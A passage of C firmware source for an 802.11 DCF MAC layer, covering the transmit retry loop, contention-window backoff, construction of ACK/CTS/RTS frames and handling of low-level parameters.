		// The phy_params (as opposed to phy_params2) element is used for the MPDU itself. If we are waiting for a CTS and we do not
		// receive one, CPU_HIGH will know to ignore this element of low_tx_details (since the MPDU will not be transmitted).

		if(((tx_frame_info->num_tx_attempts) == 1) && (n_slots != n_slots_readback)){
			// For the first transmission (non-retry) of an MPDU, the number of
			// slots used by the backoff process is ambiguous. The n_slots we provided
			// to wlan_mac_tx_ctrl_A_params is only a suggestion. If the medium has been
			// idle for a DIFS, then there will not be a backoff. Or, if another backoff is
			// currently running, the MAC Config Core A will inherit that backoff. By
			// immediately reading back the slot count after starting the core, we can
			// overwrite the number of slots that we will fill into low_tx_details with
			// the correct value
			n_slots = n_slots_readback;
		}


		low_tx_details.flags						= 0;
		low_tx_details.phy_params_mpdu.mcs          = tx_frame_info->params.phy.mcs;
		low_tx_details.phy_params_mpdu.phy_mode     = tx_frame_info->params.phy.phy_mode;
		low_tx_details.phy_params_mpdu.power        = tx_frame_info->params.phy.power;
		low_tx_details.phy_params_mpdu.antenna_mode = tx_frame_info->params.phy.antenna_mode;

		// If RTS/CTS isn't used, these fields should just be ignored
		low_tx_details.phy_params_ctrl.power        = tx_frame_info->params.phy.power;
		low_tx_details.phy_params_ctrl.antenna_mode = tx_frame_info->params.phy.antenna_mode;

		low_tx_details.chan_num    = wlan_mac_low_get_active_channel();
		low_tx_details.cw          = (1 << gl_cw_exp)-1; //(2^(gl_cw_exp) - 1)
		low_tx_details.ssrc        = gl_stationShortRetryCount;
		low_tx_details.slrc        = gl_stationLongRetryCount;
		low_tx_details.src         = short_retry_count;
		low_tx_details.lrc         = long_retry_count;

		// NOTE: the pre-Tx backoff may not occur for the initial transmission attempt. If the medium has been idle for >DIFS when
		// the first Tx occurs the DCF state machine will not start a backoff. The upper-level MAC should compare the num_slots value
		// to the time delta between the accept and start times of the first transmission to determine whether the pre-Tx backoff
		// actually occurred.
		low_tx_details.num_slots   	  = n_slots;
		low_tx_details.attempt_number = tx_frame_info->num_tx_attempts;

		// Wait for the MPDU Tx to finish
		do { // while(tx_status & WLAN_MAC_STATUS_MASK_TX_A_PENDING)

			// Poll the DCF core status register
			mac_hw_status = wlan_mac_get_status();

			// Fill in the timestamp if indicated by the flags, only possible after Tx PHY has started
			if ( (mac_hw_status & WLAN_MAC_STATUS_MASK_TX_PHY_ACTIVE) && (tx_has_started == 0)) {

				if((tx_frame_info->flags) & TX_FRAME_INFO_FLAGS_FILL_TIMESTAMP){
					//Note: Probe responses still need their timestamp to be filled in, so this clause remains
					//even though no beacons will be sent here
					// Insert the TX START timestamp
					*((u64*)(((u8*)header + 24))) = ((u64)wlan_mac_low_get_tx_start_timestamp())+T_TIMESTAMP_FIELD_OFFSET;
				}

				tx_has_started = 1;

				if(req_timeout){
					gl_waiting_for_response = 1;
				}

				if(tx_wait_state == TX_WAIT_CTS) {
					// This will potentially be overwritten with TX_DETAILS_RTS_MPDU should we make it that far.
					low_tx_details.tx_details_type  = TX_DETAILS_RTS_ONLY;
					low_tx_details.tx_start_timestamp_ctrl = wlan_mac_low_get_tx_start_timestamp();
					low_tx_details.tx_start_timestamp_frac_ctrl = wlan_mac_low_get_tx_start_timestamp_frac();

				} else if ((tx_mode == TX_MODE_LONG) && (tx_wait_state == TX_WAIT_ACK)) {
					// NOTE: this clause will overwrite the previous TX_DETAILS_RTS_ONLY state in the event a CTS is received.
					low_tx_details.tx_details_type  = TX_DETAILS_RTS_MPDU;
					low_tx_details.tx_start_timestamp_mpdu = wlan_mac_low_get_tx_start_timestamp();
					low_tx_details.tx_start_timestamp_frac_mpdu = wlan_mac_low_get_tx_start_timestamp_frac();

				} else {
					// This is a non-RTS/CTS-protected MPDU transmission
					low_tx_details.tx_details_type  = TX_DETAILS_MPDU;
					low_tx_details.tx_start_timestamp_mpdu = wlan_mac_low_get_tx_start_timestamp();
					low_tx_details.tx_start_timestamp_frac_mpdu = wlan_mac_low_get_tx_start_timestamp_frac();
				}


			}



			// Transmission is complete
			if( mac_hw_status & WLAN_MAC_STATUS_MASK_TX_A_DONE ) {

				// Switch on the result of the transmission attempt
				//  Safe to read tx_ctrl_status here - TX_A_RESULT is only valid after TX_A_DONE asserts, which just happened
				mac_tx_ctrl_status = wlan_mac_get_tx_ctrl_status();
				switch (mac_tx_ctrl_status & WLAN_MAC_TXCTRL_STATUS_MASK_TX_A_RESULT) {

					//---------------------------------------------------------------------
					case WLAN_MAC_TXCTRL_STATUS_TX_A_RESULT_NONE:
						// Transmission was immediately successful - this implies no post-Tx timeout was required,
						// so the core didn't wait for any post-Tx receptions (i.e. multicast/broadcast transmission)
						//
						switch(tx_mode) {
							case TX_MODE_SHORT:
								reset_ssrc();
								reset_cw();
							break;
							case TX_MODE_LONG:
								reset_slrc();
								reset_cw();
							break;
						}

						// Start a post-Tx backoff using the updated contention window
						n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
						wlan_mac_dcf_hw_start_backoff(n_slots);
						gl_waiting_for_response = 0;

						// Send IPC message containing the details about this low-level transmission
						wlan_mac_low_send_low_tx_details(pkt_buf, &low_tx_details);
						tx_frame_info->tx_result = TX_FRAME_INFO_RESULT_SUCCESS;
						return;
					break;

					//---------------------------------------------------------------------
					case WLAN_MAC_TXCTRL_STATUS_TX_A_RESULT_RX_STARTED:
						// Transmission ended, followed by a new reception (hopefully a CTS or ACK)

						// Handle the new reception
						rx_status       = wlan_mac_low_poll_frame_rx();
						gl_waiting_for_response = 0;

						gl_long_mpdu_pkt_buf = PKT_BUF_INVALID;

						// Check if the reception is an ACK addressed to this node, received with a valid checksum
						if ((tx_wait_state == TX_WAIT_CTS) &&
							(rx_status & FRAME_RX_RET_STATUS_RECEIVED_PKT) &&
							(rx_status & FRAME_RX_RET_TYPE_CTS) &&
							(rx_status & FRAME_RX_RET_STATUS_GOOD) &&
							(rx_status & FRAME_RX_RET_ADDR_MATCH)) {

//							low_tx_details.flags |= TX_DETAILS_FLAGS_RECEIVED_RESPONSE;

//							tx_wait_state = TX_WAIT_ACK;

							// We received the CTS, so we can reset our SSRC
							//     NOTE: as per 9.3.3 of 802.11-2012, we do not reset our CW
							//
//							reset_ssrc();

							// At this point, the MAC tx state machine has started anew to send a the MPDU itself.
							// This was triggered by the frame_receive() context.  We know that the frame_receive context
							// has started the transmission of the MPDU.  This ensures we are not kicked out of the
							// do-while loop.
							//
							// NOTE: This assignment is better than re-reading wlan_mac_get_status() in the case of a short
							// MPDU, where we may skip the PENDING state directly to DONE without this code context seeing it.
							//
//							mac_hw_status |= WLAN_MAC_STATUS_MASK_TX_A_PENDING;

							// Send IPC message containing the details about this low-level transmission
//							wlan_mac_low_send_low_tx_details(pkt_buf, &low_tx_details);

//							continue;
							low_tx_details.flags |= TX_DETAILS_FLAGS_RECEIVED_RESPONSE;

								// Update contention window
							switch(tx_mode) {
								case TX_MODE_SHORT:
									reset_ssrc();
									reset_cw();
								break;
								case TX_MODE_LONG:
									reset_slrc();
									reset_cw();
								break;
							}

							// Start a post-Tx backoff using the updated contention window
							n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
							wlan_mac_dcf_hw_start_backoff(n_slots);

							// Send IPC message containing the details about this low-level transmission
							wlan_mac_low_send_low_tx_details(pkt_buf, &low_tx_details);
							tx_frame_info->tx_result = TX_FRAME_INFO_RESULT_SUCCESS;
							return;

						} else if ((tx_wait_state == TX_WAIT_ACK) &&
								   (rx_status & FRAME_RX_RET_STATUS_RECEIVED_PKT) &&
								   (rx_status & FRAME_RX_RET_TYPE_ACK) &&
								   (rx_status & FRAME_RX_RET_STATUS_GOOD) &&
								   (rx_status & FRAME_RX_RET_ADDR_MATCH)) {

								low_tx_details.flags |= TX_DETAILS_FLAGS_RECEIVED_RESPONSE;

								// Update contention window
								switch(tx_mode) {
									case TX_MODE_SHORT:
										reset_ssrc();
										reset_cw();
									break;
									case TX_MODE_LONG:
										reset_slrc();
										reset_cw();
									break;
								}

								// Start a post-Tx backoff using the updated contention window
								n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
								wlan_mac_dcf_hw_start_backoff(n_slots);

								// Send IPC message containing the details about this low-level transmission
								wlan_mac_low_send_low_tx_details(pkt_buf, &low_tx_details);
								tx_frame_info->tx_result = TX_FRAME_INFO_RESULT_SUCCESS;
								return;

						} else {
							// Received a packet immediately after transmitting, but it wasn't the ACK we wanted
							// It could have been our ACK with a bad checksum or a different packet altogether

							switch(tx_wait_state) {
								case TX_WAIT_ACK:
									// We were waiting for an ACK
									//   - Depending on the size of the MPDU, we will increment either the SRC or the LRC
									//
									header->frame_control_2 = (header->frame_control_2) | MAC_FRAME_CTRL2_FLAG_RETRY;

									switch(tx_mode) {
										case TX_MODE_SHORT:
											increment_src(&short_retry_count);
										break;
										case TX_MODE_LONG:
											increment_lrc(&long_retry_count);
										break;
									}
								break;

								case TX_WAIT_CTS:
									// We were waiting for a CTS but did not get it.
									//     - Increment the SRC
									//
									increment_src(&short_retry_count);
								break;

								case TX_WAIT_NONE:
									xil_printf("Error: unexpected state");
								break;
							}

							// Start the post-Tx backoff
							n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
							wlan_mac_dcf_hw_start_backoff(n_slots);
							// Now we evaluate the SRC and LRC to see if either has reached its maximum
							//     NOTE:  Use >= here to handle unlikely case of retryLimit values changing mid-Tx
							if ((short_retry_count >= gl_dot11ShortRetryLimit) ||
								(long_retry_count >= gl_dot11LongRetryLimit )) {
								gl_waiting_for_response = 0;
								tx_frame_info->tx_result = TX_FRAME_INFO_RESULT_FAILURE;
								return;
							}

							poll_tbtt_and_send_beacon();

							// Poll IPC rx
							// TODO: Need to handle implications of an IPC message changing something like channel
							wlan_mac_low_poll_ipc_rx();

							// Send IPC message containing the details about this low-level transmission
							wlan_mac_low_send_low_tx_details(pkt_buf, &low_tx_details);

							// Jump to next loop iteration
							continue;
						}
					break;

					//---------------------------------------------------------------------
					case WLAN_MAC_TXCTRL_STATUS_TX_A_RESULT_TIMEOUT:
						// Tx required timeout, timeout expired with no receptions
						gl_waiting_for_response = 0;

						gl_long_mpdu_pkt_buf = PKT_BUF_INVALID;

						switch (tx_wait_state) {
							case TX_WAIT_ACK:
								// We were waiting for an ACK
								//     - Depending on the size of the MPDU, we will increment either the SRC or the LRC
								//
								header->frame_control_2 = (header->frame_control_2) | MAC_FRAME_CTRL2_FLAG_RETRY;

								switch(tx_mode){
									case TX_MODE_SHORT:
										increment_src(&short_retry_count);
									break;
									case TX_MODE_LONG:
										increment_lrc(&long_retry_count);
									break;
								}
							break;

							case TX_WAIT_CTS:
								// We were waiting for a CTS but did not get it.
								//     - Increment the SRC
								increment_src(&short_retry_count);
							break;

							case TX_WAIT_NONE:
								xil_printf("Error: unexpected state");
							break;
						}

						// Start the post-Tx backoff
						n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
						wlan_mac_dcf_hw_start_backoff(n_slots);

						// Send IPC message containing the details about this low-level transmission
						wlan_mac_low_send_low_tx_details(pkt_buf, &low_tx_details);

						// Now we evaluate the SRC and LRC to see if either has reached its maximum
						if ((short_retry_count == gl_dot11ShortRetryLimit) ||
							(long_retry_count  == gl_dot11LongRetryLimit )) {
							tx_frame_info->tx_result = TX_FRAME_INFO_RESULT_FAILURE;
							return;
						}
						poll_tbtt_and_send_beacon();


						// Poll IPC rx
						// TODO: Need to handle implications of an IPC message changing something like channel
						wlan_mac_low_poll_ipc_rx();

						// Jump to next loop iteration
						continue;
					break;
				}

			// else for if(mac_hw_status & WLAN_MAC_STATUS_MASK_TX_A_DONE)
			} else if (tx_has_started == 0) {
				//  This is the same MAC status check performed in the framework wlan_mac_low_poll_frame_rx()
				//  It is critical to check the Rx status here using the same status register read that was
				//  used in the Tx state checking above. Skipping this and calling wlan_mac_low_poll_frame_rx()
				//  directly leads to a race between the Tx status checking above and Rx status checking
				if (mac_hw_status & WLAN_MAC_STATUS_MASK_RX_PHY_STARTED) {
					gl_waiting_for_response = 0;
					rx_status = wlan_mac_low_poll_frame_rx();
				} else{
					poll_tbtt_and_send_beacon();

					// Poll IPC rx
					// TODO: Need to handle implications of an IPC message changing something like channel
					wlan_mac_low_poll_ipc_rx();
				}
			} // END if(Tx A state machine done)
		} while( mac_hw_status & WLAN_MAC_STATUS_MASK_TX_A_PENDING );
	} // end retransmission loop
    gl_waiting_for_response = 0;
    return;
}



/*****************************************************************************/
/**
 * @brief Increment Short Retry Count
 *
 * This function increments the short retry count. According to Section 9.3.3
 * of 802.11-2012, incrementing the short retry count also causes the
 * the following:
 * 		1) An increment of the station short retry count
 * 		2) An increase of the contention window (which is technically dependent
 * 		   on the station count incremented in the first step)
 *
 * @param   src_ptr          - Pointer to short retry count
 * @return  None
 */
inline void increment_src(u16* src_ptr){
    // Increment the Short Retry Count
    (*src_ptr)++;

    gl_stationShortRetryCount = sat_add32(gl_stationShortRetryCount, 1);

    if (gl_stationShortRetryCount == gl_dot11ShortRetryLimit) {
        reset_cw();
    } else {
        gl_cw_exp = min(gl_cw_exp + 1, gl_cw_exp_max);
    }
}



/*****************************************************************************/
/**
 * @brief Increment Long Retry Count
 *
 * This function increments the long retry count. According to Section 9.3.3
 * of 802.11-2012, incrementing the long retry count also causes the
 * the following:
 * 		1) An increment of the station long retry count
 * 		2) An increase of the contention window (which is technically dependent
 * 		   on the station count incremented in the first step)
 *
 * @param   src_ptr          - Pointer to long retry count
 * @return  None
 */
inline void increment_lrc(u16* lrc_ptr){
    // Increment the Long Retry Count
    (*lrc_ptr)++;

    gl_stationLongRetryCount = sat_add32(gl_stationLongRetryCount, 1);

    if(gl_stationLongRetryCount == gl_dot11LongRetryLimit){
        reset_cw();
    } else {
        gl_cw_exp = min(gl_cw_exp + 1, gl_cw_exp_max);
    }
}



/*****************************************************************************/
/**
 * @brief Reset Station Short Retry Count
 *
 * @param   None
 * @return  None
 *
 * @note    Resetting the SSRC does not necessarily indicate that the contention window should be reset.
 *     e.g., the reception of a valid CTS.
 */
inline void reset_ssrc(){
    gl_stationShortRetryCount = 0;
}



/*****************************************************************************/
/**
 * @brief Reset Station Long Retry Count
 *
 * @param   None
 * @return  None
 */
inline void reset_slrc(){
    gl_stationLongRetryCount = 0;
}



/*****************************************************************************/
/**
 * @brief Reset Contention Window
 *
 * @param   None
 * @return  None
 */
inline void reset_cw(){
    gl_cw_exp = gl_cw_exp_min;
}



/*****************************************************************************/
/**
 * @brief Generate a random number in the range set by the current contention window
 *
 * When reason is RAND_SLOT_REASON_IBSS_BEACON the random draw is taken from the range
 * [0, 2*CWmin], used for pre-beacon backoffs in IBSS (per 802.11-2012 10.1.3.3)
 *
 * @param   reason           - Code for the random draw; must be RAND_SLOT_REASON_STANDARD_ACCESS or RAND_SLOT_REASON_IBSS_BEACON
 * @return  u32              - Random integer based on reason
 */
inline u32 rand_num_slots(u8 reason){
    // Generates a uniform random value between [0, (2^(gl_cw_exp) - 1)], where gl_cw_exp is a positive integer
    // This function assumed RAND_MAX = 2^31.
    // | gl_cw_exp |    CW       |
    // |     4     |  [0,   15]  |
    // |     5     |  [0,   31]  |
    // |     6     |  [0,   63]  |
    // |     7     |  [0,  123]  |
    // |     8     |  [0,  255]  |
    // |     9     |  [0,  511]  |
    // |    10     |  [0, 1023]  |
    //
    volatile u32 n_slots;

    switch(reason) {
        case RAND_SLOT_REASON_STANDARD_ACCESS:
            n_slots = ((unsigned int)rand() >> (32 - (gl_cw_exp + 1)));
        break;

        case RAND_SLOT_REASON_IBSS_BEACON:
            // Section 10.1.3.3 of 802.11-2012: Backoffs prior to IBSS beacons are drawn from [0, 2*CWmin]
            n_slots = ((unsigned int)rand() >> (32 - (gl_cw_exp_min + 1 + 1)));
        break;
    }

    return n_slots;
}



/*****************************************************************************/
/**
 * @brief Start a backoff
 *
 * This function will start a backoff.  If a backoff is already running, the backoff-start attempt
 * will be safely ignored and the function will do nothing.
 *
 * @param   num_slots        - Duration of backoff interval, in units of slots
 * @return  None
 */
void wlan_mac_dcf_hw_start_backoff(u16 num_slots) {
    // WLAN_MAC_REG_SW_BACKOFF_CTRL:
    //     b[15:0] : Num slots
    //     b[31]   : Start backoff

    // Write num_slots and toggle start
    Xil_Out32(WLAN_MAC_REG_SW_BACKOFF_CTRL, (num_slots & 0xFFFF) | 0x80000000);
    Xil_Out32(WLAN_MAC_REG_SW_BACKOFF_CTRL, (num_slots & 0xFFFF));
}



/*****************************************************************************/
/**
 * @brief Construct an ACK frame
 *
 * @param   pkt_buf_addr     - Address of Tx packet buffer where to construct new ACK packet
 * @param   address_ra       - Pointer to 6-byte MAC address of receiving node
 * @return  int              - Number of bytes in the frame
 */
int wlan_create_ack_frame(void* pkt_buf_addr, u8* address_ra) {

    mac_header_80211_ACK* ack_header;

    ack_header = (mac_header_80211_ACK*)(pkt_buf_addr);

    ack_header->frame_control_1 = MAC_FRAME_CTRL1_SUBTYPE_ACK;
    ack_header->frame_control_2 = 0;
    ack_header->duration_id     = 0;

    memcpy(ack_header->address_ra, address_ra, 6);

    // Include FCS in packet size (MAC accounts for FCS, even though the PHY calculates it)
    return (sizeof(mac_header_80211_ACK) + WLAN_PHY_FCS_NBYTES);
}



/*****************************************************************************/
/**
 * @brief Construct a CTS frame
 *
 * @param   pkt_buf_addr     - Address of Tx packet buffer where to construct new ACK packet
 * @param   address_ra       - Pointer to 6-byte MAC address of receiving node
 * @param   duration         - Duration of the CTS
 * @return  int              - Number of bytes in the frame
 */
int wlan_create_cts_frame(void* pkt_buf_addr, u8* address_ra, u16 duration) {

    mac_header_80211_CTS* cts_header;

    cts_header = (mac_header_80211_CTS*)(pkt_buf_addr);

    cts_header->frame_control_1 = MAC_FRAME_CTRL1_SUBTYPE_CTS;
    cts_header->frame_control_2 = 0;
    cts_header->duration_id     = duration;

    memcpy(cts_header->address_ra, address_ra, 6);

    // Include FCS in packet size (MAC accounts for FCS, even though the PHY calculates it)
    return (sizeof(mac_header_80211_CTS) + WLAN_PHY_FCS_NBYTES);
}



/*****************************************************************************/
/**
 * @brief Construct an RTS frame
 *
 * @param   pkt_buf_addr     - Address of Tx packet buffer where to construct new ACK packet
 * @param   address_ra       - Pointer to 6-byte MAC address of receiving node
 * @param   address_ta       - Pointer to 6-byte MAC address of transmitting node
 * @param   duration         - Duration of the RTS
 * @return  int              - Number of bytes in the frame
 */
int wlan_create_rts_frame(void* pkt_buf_addr, u8* address_ra, u8* address_ta, u16 duration) {

    mac_header_80211_RTS* rts_header;

    rts_header = (mac_header_80211_RTS*)(pkt_buf_addr);

    rts_header->frame_control_1 = MAC_FRAME_CTRL1_SUBTYPE_RTS;
    rts_header->frame_control_2 = 0;
    rts_header->duration_id     = duration;

    memcpy(rts_header->address_ra, address_ra, MAC_ADDR_LEN);
    memcpy(rts_header->address_ta, address_ta, MAC_ADDR_LEN);

    // Include FCS in packet size (MAC accounts for FCS, even though the PHY calculates it)
    return (sizeof(mac_header_80211_RTS) + WLAN_PHY_FCS_NBYTES);
}



/*****************************************************************************/
/**
 * @brief Process DCF Low Parameters
 *
 * This method is part of the IPC_MBOX_LOW_PARAM parameter processing in the low framework.  It
 * will process DCF specific low parameters.
 *
 * @param   mode             - Mode to process parameter:  IPC_REG_WRITE_MODE or IPC_REG_READ_MODE
 * @param   payload          - Pointer to parameter and arguments
 * @return  int              - Status
 */
int process_low_param(u8 mode, u32* payload){

    switch(mode){
        case IPC_REG_WRITE_MODE: {
            switch(payload[0]){

                //---------------------------------------------------------------------
                case LOW_PARAM_DCF_PHYSICAL_CS_THRESH: {
                    if(payload[1] < 1023){
                        wlan_phy_rx_set_cca_thresh(payload[1] * PHY_RX_RSSI_SUM_LEN);
                    } else {
                        wlan_phy_rx_set_cca_thresh(0xFFFF);
                    }
                }
                break;

                //---------------------------------------------------------------------
                case LOW_PARAM_DCF_RTS_THRESH: {
                    gl_dot11RTSThreshold = payload[1];
                }
                break;

                //---------------------------------------------------------------------
                case LOW_PARAM_DCF_DOT11SHORTRETRY: {
                    gl_dot11ShortRetryLimit = payload[1];
                }
                break;

                //---------------------------------------------------------------------
                case LOW_PARAM_DCF_DOT11LONGRETRY: {
                    gl_dot11LongRetryLimit = payload[1];
                }
                break;

                //---------------------------------------------------------------------
                case LOW_PARAM_DCF_CW_EXP_MIN: {
                    gl_cw_exp_min = payload[1];
                }
                break;

                //---------------------------------------------------------------------
                case LOW_PARAM_DCF_CW_EXP_MAX: {
                    gl_cw_exp_max = payload[1];
                }
                break;

                //---------------------------------------------------------------------
                default: {
                    xil_printf("Unknown param 0x%08x\n", payload[0]);
                }
                break;
            }
        }
        break;

        case IPC_REG_READ_MODE: {
            // Not supported.  See comment in wlan_mac_low.c for IPC_REG_READ_MODE mode.
        }
        break;

        default: {
            xil_printf("Unknown mode 0x%08x\n", mode);
        }
        break;
    }

    return 0;
}
